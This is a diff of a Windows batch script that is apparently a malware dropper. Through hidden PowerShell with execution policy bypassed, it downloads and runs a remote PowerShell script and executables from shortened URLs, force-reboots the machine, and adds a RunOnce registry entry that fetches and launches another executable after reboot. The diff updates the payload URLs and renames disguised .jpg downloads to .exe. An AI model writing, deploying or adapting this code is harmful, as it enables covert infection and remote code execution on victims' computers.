@@ -5,11 +5,10 @@ setlocal
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://kntn.ly/2594ea64' -OutFile 'C:\Windows\Temp\script.ps1'; . 'C:\Windows\Temp\script.ps1'"
 
 :: Download and execute EXE
-powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://kntn.ly/bf7a6a6b' -OutFile 'C:\Windows\Temp\file.jpg'; Start-Process 'C:\Windows\Temp\file.jpg'"
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://kntn.ly/1f6e951c' -OutFile 'C:\Windows\Temp\file.exe'; Start-Process 'C:\Windows\Temp\file.exe'"
 
 :: Reboot system
 shutdown /r /f /t 0
 
 :: On next boot, download and run another executable with 2-minute delay
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "PostRebootTask" /t REG_SZ /d "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Start-Sleep -Seconds 120; Invoke-WebRequest -Uri 'https://kntn.ly/bf7a6a6b' -OutFile 'C:\Windows\Temp\post.jpg'; Start-Process 'C:\Windows\Temp\post.jpg'\"" /f
-
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "PostRebootTask" /t REG_SZ /d "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Start-Sleep -Seconds 120; Invoke-WebRequest -Uri 'https://kntn.ly/aa848473' -OutFile 'C:\Windows\Temp\post.exe'; Start-Process 'C:\Windows\Temp\post.exe'\"" /f
